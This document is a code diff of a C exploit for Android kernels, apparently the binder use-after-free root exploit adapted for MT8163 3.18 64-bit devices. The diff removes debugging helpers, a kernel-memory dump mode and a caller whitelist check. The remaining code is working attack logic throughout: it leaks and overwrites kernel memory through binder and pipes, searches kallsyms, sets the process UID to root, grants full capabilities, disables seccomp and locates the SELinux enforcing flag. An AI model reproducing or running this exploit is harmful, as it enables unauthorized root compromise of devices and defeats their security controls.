@@ -6,15 +6,11 @@
  * Some stuff from Grant Hernandez to achieve root (Oct 15th 2019)
  * Modified by Alexander R. Pruss for 3.18 kernels where WAITQUEUE_OFFSET is 0x98
  *
- * October 2019
+ * Modified by Roger Ortiz for MT8163 3.18.X (64-bit) devices.
 */
 
 #define DELAY_USEC 200000
 
-// $ uname -a
-// Linux localhost 3.18.71-perf+ #1 SMP PREEMPT Tue Jul 17 14:44:34 KST 2018 aarch64
-//#define KERNEL_BASE 0xffffffc000080000ul
-//#define KERNEL_BASE 0xffffffc000000000ul
 #define KERNEL_BASE search_base
 #define OFFSET__thread_info__flags 0x000
 #define OFFSET__task_struct__stack 0x008
@@ -34,15 +30,9 @@
 #define KALLSYMS_CACHING
 #define KSYM_NAME_LEN 128
 
-//Not needed, but saved for future use; the offsets are for LGV20 LS998
-//#define OFFSET__task_struct__seccomp 0x9b0
-//#define OFFSET__cred__user_ns 0x088 // if you define this, the first run might be a little faster
-//#define OFFSET__task_struct__cred 0x550
 #define OFFSET__cred__security 0x078
 #define OFFSET__cred__cap_inheritable 0x028
 #define OFFSET__cred__cap_ambient 0x048
-//#define OFFSET__task_struct__mm 0x308
-
 
 #define _GNU_SOURCE
 #include <libgen.h>
@@ -75,7 +65,6 @@
 #define MAX(x, y) ((x) > (y) ? (x) : (y))
 
 #define BINDER_THREAD_EXIT 0x40046208ul
-// NOTE: we don't cover the task_struct* here; we want to leave it uninitialized
 #define BINDER_THREAD_SZ 0x198
 #define IOVEC_ARRAY_SZ (BINDER_THREAD_SZ / 16) //25
 #define WAITQUEUE_OFFSET (0xA8)
@@ -166,7 +155,6 @@ void error(char* fmt, ...)
     vfprintf(stderr, fmt, ap);
     vsnprintf(text, 199, fmt, ap);
     va_end(ap);
-//    fprintf(stderr, ": %s\n", errno ? strerror(errno) : "error");
     strftime(date, 100, "%T: ", localtime(&rtime));
     text[198] = '\n';
     text[199] = '\0';
@@ -196,43 +184,9 @@ int isKernelPointer(unsigned long p) {
 
 unsigned long kernel_read_ulong(unsigned long kaddr);
 
-void hexdump_memory(void *_buf, size_t byte_count)
-{
-    unsigned char *buf = _buf;
-    unsigned long byte_offset_start = 0;
-    if (byte_count % 16)
-        error( "hexdump_memory called with non-full line");
-    for (unsigned long byte_offset = byte_offset_start; byte_offset < byte_offset_start + byte_count;
-         byte_offset += 16)
-    {
-        char line[1000];
-        char *linep = line;
-        linep += sprintf(linep, "%08lx  ", byte_offset);
-        for (int i = 0; i < 16; i++)
-        {
-            linep += sprintf(linep, "%02hhx ", (unsigned char)buf[byte_offset + i]);
-        }
-        linep += sprintf(linep, " |");
-        for (int i = 0; i < 16; i++)
-        {
-            char c = buf[byte_offset + i];
-            if (isalnum(c) || ispunct(c) || c == ' ')
-            {
-                *(linep++) = c;
-            }
-            else
-            {
-                *(linep++) = '.';
-            }
-        }
-        linep += sprintf(linep, "|");
-        puts(line);
-    }
-}
-
-int epfd;
-
-int binder_fd;
+// File descriptors follow.
+int epfd; // epoll fd
+int binder_fd; // binder fd
 
 unsigned long iovec_size(struct iovec *iov, int n)
 {
@@ -280,13 +234,9 @@ int clobber_data(unsigned long payloadAddress, const void *src, unsigned long pa
 
     unsigned long second_write_chunk[SECOND_WRITE_CHUNK_IOVEC_ITEMS * 2] = {
             (unsigned long)dummyBuffer,
-            /* iov_base (currently in use) */ // wq->task_list->next
             SECOND_WRITE_CHUNK_IOVEC_ITEMS * 0x10,
-            /* iov_len (currently in use) */ // wq->task_list->prev
-
-            payloadAddress, //(unsigned long)current_ptr+0x8, // current_ptr+0x8, // current_ptr + 0x8, /* next iov_base (addr_limit) */
+            payloadAddress,
             payloadLength,
-
             (unsigned long)&testDatum,
             sizeof(testDatum),
     };
@@ -392,8 +342,9 @@ int leak_data(void *leakBuffer, int leakAmount,
     iovec_array[IOVEC_INDX_FOR_WQ].iov_len = 0;                                /* spinlock: will turn to UAF_SPINLOCK */
     iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_base = (unsigned long *)0xDEADBEEF; /* wq->task_list->next */
     iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_len = adjLeakAmount;                /* wq->task_list->prev */
-    iovec_array[IOVEC_INDX_FOR_WQ + 2].iov_base = (unsigned long *)0xDEADBEEF; // we shouldn't get to here
+    iovec_array[IOVEC_INDX_FOR_WQ + 2].iov_base = (unsigned long *)0xDEADBEEF; /* we shouldn't get to here */
     iovec_array[IOVEC_INDX_FOR_WQ + 2].iov_len = extraLeakAmount + UAF_SPINLOCK + 8;
+
     unsigned long totalLength = iovec_size(iovec_array, IOVEC_ARRAY_SZ);
     unsigned long maxLength = iovec_size(iovec_array, IOVEC_ARRAY_SZ);
     unsigned char *dataBuffer = malloc(maxLength);
@@ -488,7 +439,6 @@ int leak_data(void *leakBuffer, int leakAmount,
                 error( "extra leaking");
             }
             write(leakPipe[1], extraLeakBuffer, extraLeakAmount);
-            //hexdump_memory(extraLeakBuffer, (extraLeakAmount+15)/16*16);
         }
         if (task_struct_plus_8_p != NULL)
         {
@@ -562,11 +512,10 @@ int leak_data(void *leakBuffer, int leakAmount,
     if (!childSucceeded)
         success = 0;
 
-
     if (task_struct_ptr_p != NULL)
         memcpy(task_struct_ptr_p, dataBuffer + TASK_STRUCT_OFFSET_FROM_TASK_LIST, 8);
 
-    DONE:
+DONE:
     close(pipefd[0]);
     close(pipefd[1]);
     close(leakPipe[0]);
@@ -574,8 +523,6 @@ int leak_data(void *leakBuffer, int leakAmount,
 
     int status;
     wait(&status);
-    //if (wait(&status) != fork_ret) error( "wait");
-
     free(dataBuffer);
 
     if (success)
@@ -608,16 +555,13 @@ int clobber_data_retry(unsigned long payloadAddress, const void *src, unsigned l
     return try < RETRIES;
 }
 
-
 int kernel_rw_pipe[2];
-
 struct kernel_buffer {
     unsigned char pageBuffer[PAGE];
     unsigned long pageBufferOffset;
 } kernel_buffer = { .pageBufferOffset = 0 };
 
-void reset_kernel_pipes()
-{
+void reset_kernel_pipes() {
     kernel_buffer.pageBufferOffset = 0;
     close(kernel_rw_pipe[0]);
     close(kernel_rw_pipe[1]);
@@ -625,8 +569,7 @@ void reset_kernel_pipes()
         error( "kernel_rw_pipe");
 }
 
-int raw_kernel_write(unsigned long kaddr, void *buf, unsigned long len)
-{
+int raw_kernel_write(unsigned long kaddr, void *buf, unsigned long len) {
     if (len > PAGE)
         error( "kernel writes over PAGE_SIZE are messy, tried 0x%lx", len);
     if (write(kernel_rw_pipe[1], buf, len) != len ||
@@ -638,14 +581,12 @@ int raw_kernel_write(unsigned long kaddr, void *buf, unsigned long len)
     return len;
 }
 
-void kernel_write(unsigned long kaddr, void *buf, unsigned long len)
-{
+void kernel_write(unsigned long kaddr, void *buf, unsigned long len) {
     if (len != raw_kernel_write(kaddr, buf, len))
         message( "error with kernel writing");
 }
 
-int raw_kernel_read(unsigned long kaddr, void *buf, unsigned long len)
-{
+int raw_kernel_read(unsigned long kaddr, void *buf, unsigned long len) {
     if (len > PAGE)
         error( "kernel writes over PAGE_SIZE are messy, tried 0x%lx", len);
     if (write(kernel_rw_pipe[1], (void *)kaddr, len) != len || read(kernel_rw_pipe[0], buf, len) != len)
@@ -656,8 +597,7 @@ int raw_kernel_read(unsigned long kaddr, void *buf, unsigned long len)
     return len;
 }
 
-void kernel_read(unsigned long kaddr, void *buf, unsigned long len)
-{
+void kernel_read(unsigned long kaddr, void *buf, unsigned long len) {
     if (len > PAGE)
         error( "kernel reads over PAGE_SIZE are messy, tried 0x%lx", len);
     if (len != raw_kernel_read(kaddr, buf, len))
@@ -672,32 +612,32 @@ unsigned char kernel_read_uchar(unsigned long offset) {
     return kernel_buffer.pageBuffer[offset-kernel_buffer.pageBufferOffset];
 }
 
-unsigned long kernel_read_ulong(unsigned long kaddr)
-{
+unsigned long kernel_read_ulong(unsigned long kaddr) {
     unsigned long data;
     kernel_read(kaddr, &data, sizeof(data));
     return data;
 }
-unsigned long kernel_read_uint(unsigned long kaddr)
-{
+
+unsigned long kernel_read_uint(unsigned long kaddr) {
     unsigned int data;
     kernel_read(kaddr, &data, sizeof(data));
     return data;
 }
-void kernel_write_ulong(unsigned long kaddr, unsigned long data)
-{
-    kernel_write(kaddr, &data, sizeof(data));
-}
-void kernel_write_uint(unsigned long kaddr, unsigned int data)
-{
-    kernel_write(kaddr, &data, sizeof(data));
-}
-void kernel_write_uchar(unsigned long kaddr, unsigned char data)
-{
+
+void kernel_write_ulong(unsigned long kaddr, unsigned long data) {
     kernel_write(kaddr, &data, sizeof(data));
 }
 
-// code from DrZener
+void kernel_write_uint(unsigned long kaddr, unsigned int data) {
+    kernel_write(kaddr, &data, sizeof(data));
+}
+
+void kernel_write_uchar(unsigned long kaddr, unsigned char data) {
+    kernel_write(kaddr, &data, sizeof(data));
+}
+
+// Find selinux_enforcing address from avc_denied address
+// Special thanks to DrZener for the code.
 unsigned long findSelinuxEnforcingFromAvcDenied(unsigned long avc_denied_address)
 {
     unsigned long address;
@@ -850,7 +790,7 @@ int getCredOffset(unsigned char* task_struct_data) {
             return i-8;
     }
 
-    errno=0;
+    errno = 0;
     error("Cannot find cred structure");
     return -1;
 }
@@ -923,9 +863,6 @@ int find_kallsyms_addresses(unsigned long searchStart, unsigned long searchEnd, 
                         *countP = count;
                         return 1;
                     }
-                    /*else if (count >= 10000) {
-                        message("MAIN: interesting, found a sequence of 10000 non-decreasing entries at 0x%lx", (i+j));
-                    }*/
                 }
             }
     }
@@ -973,12 +910,14 @@ int loadKallsyms() {
             return 0;
         }
         kallsyms.num_syms = count;
-        kallsyms.addresses = offset - 8 * kallsyms.num_syms; // Strip start of table to the location suggested by count
-        // This should work if we got the offset correct, i.e. we found the end of the table correctly but the start was too early. If we missed some of the start, we MUST have got it wrong because there wasn't an increasing sequence, so we bail out in the if block above.
+
+        // Strip start of table to the location suggested by count. This should work if we got the offset correct, i.e we found
+        // the end of the table correctly but the start was too early. If we missed 'some of' the start, we MUST have got it wrong
+        // because there wasn't an increasing sequence, so we bail out in the if block above.
+        kallsyms.addresses = offset - 8 * kallsyms.num_syms;
     }
 
     offset = (offset + 0xFFul) & ~0xFFul;
-
     kallsyms.names = offset;
 
     for (unsigned long i = 0 ; i < kallsyms.num_syms ; i++) {
@@ -987,17 +926,13 @@ int loadKallsyms() {
     }
 
     offset = (offset + 0xFF) & ~0xFFul;
-
     kallsyms.markers = offset;
 
     offset += 8 * ((kallsyms.num_syms + 255ul) / 256ul);
-
     offset = (offset + 0xFF) & ~0xFFul;
-
     kallsyms.token_table = offset;
 
     int tokens = 0;
-
     while (tokens < 256) {
         if (kernel_read_uchar(offset++) == 0)
             tokens++;
@@ -1019,12 +954,11 @@ int loadKallsyms() {
     kernel_read(offset, kallsyms.token_index_data, sizeof(kallsyms.token_index_data));
 
     have_kallsyms = 1;
-    good_base=1;
+    good_base = 1;
     return 1;
 }
 
 unsigned long findSymbol_memory_search(char* symbol) {
-    //message("MAIN: searching for kallsyms table");
     if (! loadKallsyms()) {
         message("MAIN: **fail** cannot find kallsyms table");
         return 0;
@@ -1121,9 +1055,7 @@ unsigned long findSymbol(unsigned long pointInKernelMemory, char *symbol)
     if (ks != NULL)
         fclose(ks);
 
-    if ( (buf[0] == 0 || strncmp(buf, "0000000000000000", 16) == 0) && fixKallsymsFormatStrings(pointInKernelMemory) == 0)
-    {
-        //   message( "MAIN: **partial failure** cannnot fix kallsyms format string");
+    if ((buf[0] == 0 || strncmp(buf, "0000000000000000", 16) == 0) && fixKallsymsFormatStrings(pointInKernelMemory) == 0) {
         address = findSymbol_memory_search(symbol);
     }
     else {
@@ -1179,101 +1111,9 @@ void checkKernelVersion() {
     if (kernel3) message("MAIN: detected kernel version 3");
     else message("MAIN: detected kernel version other than 3");
 }
-void resPid(){
-    kernel_write_uint(pid_addr,oldpid);
-}
 
-void getPackageName(unsigned uid, char* packageName) {
-    if (uid == 2000) {
-        strcpy(packageName, "adb");
-        return;
-    }
-    else if (uid == 0) {
-        strcpy(packageName, "root");
-        return;
-    }
-    strcpy(packageName, "(unknown)");
-    FILE* f = fopen("/data/system/packages.list", "r");
-    if (f == NULL)
-        return;
-    unsigned id;
-    char pack[MAX_PACKAGE_NAME];
-    while(2 == fscanf(f, "%s %u%*[^\n]", pack, &id)) {
-        if (id == uid) {
-            strncpy(packageName, pack, MAX_PACKAGE_NAME);
-            packageName[MAX_PACKAGE_NAME-1] = 0;
-            goto DONE;
-        }
-    }
-    DONE:
-    fclose(f);
-}
-
-int checkWhitelist(unsigned uid) {
-    if (uid == 0 || uid == 2000)
-        return 1;
-
-    char *path = alloca(strlen(myPath) + sizeof(whitelist));
-    strcpy(path, myPath);
-    strcat(path, whitelist);
-
-    FILE* wl = fopen(path, "r");
-
-    if (wl == NULL) {
-        message("MAIN: no whitelist, so all callers are welcome");
-        return 1;
-    }
-
-    char parent[MAX_PACKAGE_NAME];
-    getPackageName(uid, parent);
-
-    int allowed = 0;
-
-    char line[512];
-    while (NULL != fgets(line, sizeof(line), wl)) {
-        line[sizeof(line)-1] = 0;
-        char* p = line;
-        while (*p && isspace(*p))
-            p++;
-        char*q = p + strlen(p) - 1;
-        while (p < q && isspace(*q))
-            *q-- = 0;
-        if (q <= p)
-            continue;
-        if (*q == '*') {
-            if (!strncmp(parent, p, q-p-1)) {
-                allowed = 1;
-                goto DONE;
-            }
-        }
-        else if (!strcmp(parent,p)) {
-            allowed = 1;
-            goto DONE;
-        }
-    }
-
-    DONE:
-    fclose(wl);
-
-    if (allowed)
-        message("MAIN: whitelist allows %s", parent);
-    else {
-        if (parent[0]) {
-            char *path = alloca(strlen(myPath) + sizeof(denyfile));
-            strcpy(path, myPath);
-            strcat(path, denyfile);
-            FILE* f = fopen(path, "a");
-            if (f != NULL) {
-                fprintf(f, "%s\n", parent);
-                fclose(f);
-            }
-        }
-    }
-
-    return allowed;
-}
-
-/* for devices with randomized thread_info location on stack: thanks to chompie1337 */
+// For devices with randomized thread_info located on stack
+// Special thanks to chompie1337 for this code.
 unsigned long find_thread_info_ptr_kernel3(unsigned long kstack) {
     unsigned long kstack_data[16384/8];
 
@@ -1299,219 +1139,6 @@ unsigned long find_selinux_enforcing(unsigned long search_base) {
     }
     return address;
 }
-void launch_debug_console(void) {
-    printf("launching debug console; enter 'help' for quick help\n");
-    con_loop();
-}
-
-void con_loop(void) {
-    u64 kaddr;
-    size_t len;
-
-    int running = 1;
-    while (running) {
-        printf("debug> ");
-
-        char *line = NULL;
-        size_t getline_buf_len = 0;
-        if (getline(&line, &getline_buf_len, stdin) == -1)
-            err(1, "read stdin");
-        int was_handled = 0;
-
-        char *token = strtok(line, " \t\r\n\a");
-        if (token && !strcmp(token, "print") && con_consume(&token)) {}
-        else if (token && !strcmp(token, "read")) {
-            /* Not that there'd actually be any kmem allocated there, but if the
-             * read address were 0xffffffffffffffff, we'd technically be able to
-             * read exactly one byte. We ~do~ want to handle that case... right?
-             */
-            if (con_parse_hexstring(strtok(NULL, " \t\r\n\a"), &kaddr) &&
-                con_parse_number(strtok(NULL, " \t\r\n\a"), &len) &&
-                con_consume(&token) && 0 < len && len <= PAGE_SIZE &&
-                len - 1 <= ~(u64)0 - kaddr) {
-                con_kdump(kaddr, len);
-                was_handled = 1;
-            }
-        } else if (token && !strcmp(token, "write")) {
-            u8 *data = NULL;
-            if (con_parse_hexstring(strtok(NULL, " \t\r\n\a"), &kaddr) &&
-                con_parse_hexbytes(&token, &data, &len) && 0 < len &&
-                len <= PAGE_SIZE && len - 1 <= ~(u64)0 - kaddr) {
-                kernel_write(kaddr, data, len);
-                was_handled = 1;
-            }
-            free(data);
-        } /*else if (token && !strcmp(token, "shell") && con_consume(&token)) {
-            pid = fork();
-            if (pid == -1)
-                err(1, "fork");
-            if (pid == 0)
-                launch_shell();
-            pid_t status;
-            do {
-                waitpid(pid, &status, WUNTRACED);
-            } while (!WIFEXITED(status) && !WIFSIGNALED(status));
-            was_handled = 1;
-        }*/ else if (token && !strcmp(token, "help") && con_consume(&token)) {
-            printf(
-                    "quick help\n"
-                    "    print\n"
-                    "        print kernel base address, some kernel symbol offsets,\n"
-                    "        and address of current task_struct as hexstrings\n"
-                    "    read <kaddr> <len>\n"
-                    "        read <len> bytes from <kaddr> and display as a hexdump\n"
-                    "        <kaddr> is a hexstring not prefixed with 0x\n"
-                    "        <len> is 1-4096 or 0x1-0x1000\n"
-                    "    write <kaddr> <data>\n"
-                    "        write <data> to <kaddr>\n"
-                    "        <kaddr> is a hexstring not prefixed with 0x\n"
-                    "        <data> is 1-4096 hexbytes, spaces ignored, to be written *AS-IS*\n"
-                    "        e.g. if kaddr 0xffffffffdeadbeef contains an int, and you want to set\n"
-                    "        its value to 1, enter 'write ffffffffdeadbeef <data>', where <data> is\n"
-                    "        '01000000', '0100 0000', '01 00 0 0 00', etc. (our ARM is little-endian)\n"
-                    "    help\n"
-                    "        print this help\n"
-                    "    exit\n"
-                    "        exit debug console\n");
-            was_handled = 1;
-        } else if (token && !strcmp(token, "exit") && con_consume(&token)) {
-            running = 0;
-            was_handled = 1;
-        }
-
-        if (!was_handled)
-            printf("woopz; enter 'help' for quick help\n");
-
-        free(line);
-    }
-}
-int con_consume(char **token) {
-    int ret = 1;
-    do {
-        if ((*token = strtok(NULL, " \t\r\n\a")))
-            ret = 0;
-    } while (*token);
-    return ret;
-}
-int con_parse_hexstring(char *token, u64 *val) {
-    if (!token || !(*token))
-        return 0;
-    *val = 0;
-    while (*token) {
-        if (*val & 0xf000000000000000)
-            return 0;
-        else if ('0' <= *token && *token <= '9')
-            *val = *val * 16 + *token - '0';
-        else if ('a' <= *token && *token <= 'f')
-            *val = *val * 16 + *token - 'a' + 10;
-        else if ('A' <= *token && *token <= 'F')
-            *val = *val * 16 + *token - 'A' + 10;
-        else
-            return 0;
-        token++;
-    }
-    return 1;
-}
-int con_parse_number(char *token, u64 *val) {
-    if (!token || !(*token))
-        return 0;
-    if (*token == '0' && (token[1] == 'x' || token[1] == 'X'))
-        return con_parse_hexstring(token + 2, val);
-    *val = 0;
-    while (*token) {
-        if (*token < '0' || '9' < *token)
-            return 0;
-        *val = *val * 10 + *token - '0';
-        if (*val > PAGE_SIZE)
-            return 0;
-        token++;
-    }
-    return 1;
-}
-int con_parse_hexbytes(char **token, u8 **data, size_t *len) {
-    static char hexbyte[2 + 1] = {'\0'};
-
-    u8 *buf = malloc(PAGE_SIZE * sizeof(u8));
-    if (!buf)
-        err(1, "allocate memory");
-
-    *data = buf;
-    *len = 0;
-    int hexbyte_idx = 0;
-
-    while ((*token = strtok(NULL, " \t\r\n\a"))) {
-        for (char *c = *token; *c; c++) {
-            if (!isxdigit(*c))
-                return 0;
-            hexbyte[hexbyte_idx++] = *c;
-            if (hexbyte_idx == 2) {
-                hexbyte_idx = 0;
-                u64 val;
-                if (*len == PAGE_SIZE || !con_parse_hexstring(hexbyte, &val))
-                    return 0;
-                buf[(*len)++] = (u8)(val & 0xff);
-            }
-        }
-    }
-
-    return *len && !hexbyte_idx;
-}
-void con_kdump(u64 kaddr, size_t len) {
-    /* Mimic the output of `xxd`. */
-    static char line[40 + 1] = {'\0'};
-    static char text[16 + 1] = {'\0'};
-
-    if (!len)
-        return;
-
-    u8 *buf = malloc(len * sizeof(u8));
-    if (!buf)
-        err(1, "allocate memory");
-
-    kernel_read(kaddr, buf, len);
-
-    for (u64 line_offset = 0; line_offset < len; line_offset += 16) {
-        char *linep = line;
-        for (size_t i = 0; i < 16; i++) {
-            if (i + line_offset < len) {
-                char c = buf[i + line_offset];
-                linep += sprintf(linep, (i & 1) ? "%02x " : "%02x", c);
-                text[i] = (' ' <= c && c <= '~') ? c : '.';
-            } else {
-                linep += sprintf(linep, (i & 1) ? "   " : "  ");
-                text[i] = ' ';
-            }
-        }
-        printf("%016lx: %s %s\n", kaddr + line_offset, line, text);
-    }
-
-    free(buf);
-}
-
-// https://github.com/AndropaX/android_kernel_honor_hi6250/blob/ab74eadd72e5fcc1735ea9872aeeef1b1979d21c/security/selinux/ss/ebitmap.h
-#define CONFIG_64BIT // All modern Huawei devices use 64bit kernels
-#ifdef CONFIG_64BIT
-#define	EBITMAP_NODE_SIZE	64
-#else
-#define	EBITMAP_NODE_SIZE	32
-#endif
-
-#define EBITMAP_UNIT_NUMS	((EBITMAP_NODE_SIZE-sizeof(void *)-sizeof(u32))\
-					/ sizeof(unsigned long))
-
-void kebitmapSetAll(unsigned long ebitmap_ptr) {
-    unsigned int ebitmap_node_ptr = kernel_read_uint(ebitmap_ptr);
-    message("EBTM: inital node ptr is %lu (dereferenced %lu)", ebitmap_node_ptr, ebitmap_ptr);
-    int i;
-    while (ebitmap_node_ptr) {
-        for (i = 1; i <= EBITMAP_UNIT_NUMS; i++) {
-            message("EBTM: overwriting value %lu", kernel_read_uint(ebitmap_node_ptr + i * 4));
-            kernel_write_uint(ebitmap_node_ptr + i * 4, 0UL);
-        }
-        ebitmap_node_ptr = kernel_read_uint(ebitmap_node_ptr);
-        message("EBTM: next node ptr is %lu", ebitmap_node_ptr);
-    }
-}
 
 unsigned long getCommOffset(unsigned long task_struct_ptr, char comm[16]) {
     for (unsigned long ptr = task_struct_ptr; ptr < task_struct_ptr + 0xFFF; ptr = ptr + 4) {
@@ -1519,7 +1146,8 @@ unsigned long getCommOffset(unsigned long task_struct_ptr, char comm[16]) {
         kernel_read(ptr, kcomm, 16*8);
         kcomm[15] = '\0';
         printf("kcomm = %s\n", kcomm);
-        if (!strncmp(kcomm, comm, 15)) return ptr; // only compare the first 8 chars, because its easier
+        // Only compare the first 8 chars, because its easier.
+        if (!strncmp(kcomm, comm, 15)) return ptr;
     }
     error("Couldn't get the comm off!");
     return -1;
@@ -1539,7 +1167,8 @@ unsigned long get_kfiles(unsigned long task_struct_ptr, char comm[16]) {
     int tmp;
     message("looking for kfiles offset");
     for (unsigned long tmp_ptr = base_ptr + 8; tmp_ptr < base_ptr + 0xFF; tmp_ptr = tmp_ptr + 8)
-        if (raw_kernel_read(tmp_ptr, &tmp, sizeof(tmp))) { // If we successfully read an int, we found a pointer and probably the fs_struct
+        // If we successfully read an int, we found a pointer and probably the fs_struct.
+        if (raw_kernel_read(tmp_ptr, &tmp, sizeof(tmp))) {
             break;
             files_ptr = tmp_ptr + 8;
         }
@@ -1554,36 +1183,23 @@ unsigned long get_kfiles(unsigned long task_struct_ptr, char comm[16]) {
     return fd_arr;
 }
 
-unsigned long get_kfops(unsigned long task_struct_ptr, char comm[16]) {
-    int fd = open("/dev/binder", O_RDONLY);
-    if (!fd) error("Unable to open binder");
-    unsigned long fd_arr = get_kfiles(task_struct_ptr, comm);
-    unsigned long file_ptr = kernel_read_ulong(fd_arr + 8 * fd);
-    if (!file_ptr) error("Invalid fp");
-    unsigned long file_ops = kernel_read_ulong(file_ptr + 0x30);
-    if (!file_ops) error("Invalid fops");
-    return file_ops;
-}
-
-
 #define KFILE_SIZE 0x140
 
 struct kmalloc_hack_result {
     unsigned long kmem_start; // inclusive
-    unsigned long kmem_end; // exclusive
-    int fd_start; // inclusive
-    int fd_end; // inclusive
+    unsigned long kmem_end;   // exclusive
+    int fd_start;             // inclusive
+    int fd_end;               // inclusive
 };
 
 struct kmalloc_hack_result kmalloc(int size, unsigned long task_struct_ptr) {
-    // `struct file` is 0x140 long on one kernel I tested. Let's assume it's at least 0x120 to allow for variance
     int files = MAX((size + KFILE_SIZE - 1) / KFILE_SIZE, 3); // 3 is the minimum to reliably find the size of a file.
     message("kmalloc files %d", files);
     if (files >= 64) error("Too much data allocating at once");
     if (!files) error("No data allocating");
     char comm[16];
     getSelfComm(comm);
-    int fds[64] = {0}; // We can allocate a maximum of 64*KFILE_SIZE, which is pretty big
+    int fds[64] = {0}; // We can allocate a maximum of (64 * KFILE_SIZE), which is pretty big.
     bool worked = false;
     int first_fd, fd;
     int i;
@@ -1730,57 +1346,8 @@ int main(int argc, char **argv)
     }
 
     message("MAIN: thread_info = 0x%lx", thread_info_ptr);
-
     setbuf(stdout, NULL);
     message("MAIN: should have stable kernel R/W now");
-
-    if (dump) {
-        unsigned long start, count;
-        start = 0xffffffc000000000ul;
-        count = 0x1000;
-
-        if (argc >= 2)
-            sscanf(argv[1], "%lx", &start);
-
-        start &= ~7;
-
-        if (argc >= 3)
-            sscanf(argv[2], "%lx", &count);
-        unsigned long search = 0;
-
-        int emit = 0;
-
-        if (argc >= 4)
-            sscanf(argv[3], "%lx", &search);
-        else
-            emit = 1;
-
-        unsigned char page[PAGE];
-        for (unsigned long i=start; i<start+count ; i+=PAGE) {
-            kernel_read(i, page, PAGE);
-            if (!emit) {
-                for (int j=0; j<PAGE; j+=8) {
-                    if (*(unsigned long*)(page+j)==search) {
-                        emit = 1;
-                        break;
-                    }
-                }
-            }
-            if (emit) {
-                printf("%lx:\n", i);
-                unsigned long n = start+count-i;
-                if (n>=PAGE) {
-                    n = PAGE;
-                }
-                else {
-                    n = (n+15)/16*16;
-                }
-                hexdump_memory(page, n);
-            }
-        }
-        exit(0);
-    }
-
 
     message("MAIN: searching for cred offset in task_struct");
     unsigned char task_struct_data[PAGE+16];
@@ -1788,20 +1355,13 @@ int main(int argc, char **argv)
 
     unsigned long offset_task_struct__cred = getCredOffset(task_struct_data);
     puts("leaking kernel pointer (may take a while)");
-    quiet=1;
+    quiet = 1;
     kptrLeak(task_struct_ptr);
-    kptrInit=1;
+    kptrInit = 1;
     kptrLeak(task_struct_ptr);
-    quiet=0;
+    quiet = 0;
     unsigned long cred_ptr = kernel_read_ulong(task_struct_ptr + offset_task_struct__cred);
     unsigned long real_cred_ptr = kernel_read_ulong(task_struct_ptr + offset_task_struct__cred - 8);
-/*#ifdef OFFSET__cred__user_ns
-    unsigned long search_base = kernel_read_ulong(cred_ptr + OFFSET__cred__user_ns);
-    if (search_base < 0xffffffc000000000ul || search_base >= 0xffffffd000000000ul)
-        search_base = 0xffffffc001744b70ul;
-#else
-#define search_base 0xffffffff81361f00ul
-#endif*/
 
     message("MAIN: using last successful search_base = %lx", search_base);
     unsigned long kptr_res = findSymbol(search_base, "kptr_restrict");
@@ -1809,27 +1369,7 @@ int main(int argc, char **argv)
     unsigned long policydb_ptr = findSymbol(search_base, "policydb");
     message("MAIN: the policydb is located at %lu", policydb_ptr);
 
-//    unsigned long permissive_map = /*kernel_read_ulong(*/policydb_ptr + 0x74/*0x50)*/;
-//    message("MAIN: the permissive map is located at %lu", permissive_map);
-//    message("MAIN: setting all bits of permissive map");
-//    kebitmapSetAll(permissive_map);
-//    message("MAIN: everything should be permissive now!!!!");
-    if(cons==1)launch_debug_console();
-/*    unsigned long init_cred = findSymbol(search_base, "init_cred");
-    message("MAIN: init_cred=%lu", init_cred);
-    unsigned long init_sec = kernel_read_ulong(init_cred + 0x78);
-    message("MAIN: init_sec=%lu", init_sec);
-    unsigned int init_ctx = kernel_read_uint(init_sec + 4);
-    message("MAIN: Switching to init ctx (%u)", init_ctx);
-    unsigned long cred_sec=kernel_read_ulong(cred_ptr+0x78);
-    unsigned long real_cred_sec=kernel_read_ulong(real_cred_ptr+0x78);
-    message("MAIN: changeing sid to init");
-    kernel_write_uint(cred_sec+4,7);
-    kernel_write_uint(real_cred_sec+4,7);
-    /* Now in init context, we hope */
     unsigned long selinux_enforcing = find_selinux_enforcing(search_base);
-
-//    unsigned long selinux_enabled = findSymbol(search_base, "selinux_enabled");
 
     unsigned int oldUID = getuid();
     unsigned int newUid = 0;
@@ -1846,17 +1386,14 @@ int main(int argc, char **argv)
     message("MAIN: UID = %i",newUid);
     message("MAIN: enabling capabilities");
 
-    // reset securebits
-
+    // Reset 'securebits'
     kernel_write_uint(cred_ptr + OFFSET__cred__securebits, 0);
-
     kernel_write_ulong(cred_ptr+OFFSET__cred__cap_inheritable, 0x3fffffffffUL);
     kernel_write_ulong(cred_ptr + OFFSET__cred__cap_permitted, 0x3fffffffffUL);
     kernel_write_ulong(cred_ptr + OFFSET__cred__cap_effective, 0x3fffffffffUL);
     kernel_write_ulong(cred_ptr + OFFSET__cred__cap_bset, 0x3fffffffffUL);
     kernel_write_ulong(cred_ptr+OFFSET__cred__cap_ambient, 0x3fffffffffUL);
-    //unsigned long initcreds = findSymbol(search_base, "init_cred");
-    //kernel_write_ulong(task_struct_ptr + offset_task_struct__cred,initcreds);
+
     struct kmalloc_hack_result allocd = kmalloc(100, task_struct_ptr);
     message("kalloc done!");
     struct kmalloc_hack_result allocd2 = kmalloc(1000, task_struct_ptr);
@@ -1869,7 +1406,6 @@ int main(int argc, char **argv)
     {
         message("MAIN: disabling SECCOMP");
         kernel_write_ulong(thread_info_ptr + OFFSET__thread_info__flags, 0);
-        // TODO: search for seccomp offset
         int offset__task_struct__seccomp = getSeccompOffset(task_struct_data, offset_task_struct__cred, seccompStatus);
         if (offset__task_struct__seccomp < 0)
             message("MAIN: **FAIL** cannot find seccomp offset");
@@ -1925,32 +1461,7 @@ int main(int argc, char **argv)
         chdir(cwd);
     }
 
-    if (!checkWhitelist(oldUID)) {
-        if (0 != selinux_enforcing) {
-            kernel_write_uint(selinux_enforcing, prev_selinux_enforcing);
-        }
-        errno = 0;
-        error("Whitelist check failed");
-    }
-
     message("MAIN: root privileges ready");
-
-/* process hangs if these are done */
-//        unsigned long security_ptr = kernel_read_ulong(cred_ptr + OFFSET__cred__security);
-//        kernel_write_uint(security_ptr, 1310);
-//        kernel_write_uint(security_ptr+4, 1310);
-//        for (int i=0; i<6; i++)
-//           message("SID %u : ", kernel_read_uint(security_ptr + 4 * i));
-
-    FILE* check_file = fopen("/data/local/tmp/su89.success", "w");
-    if (!check_file) {
-        message("MAIN: cannot open check file");
-    } else {
-        char message[100];
-        snprintf(message, 100, "successfully gained root access at %lu", (unsigned long)time(NULL));
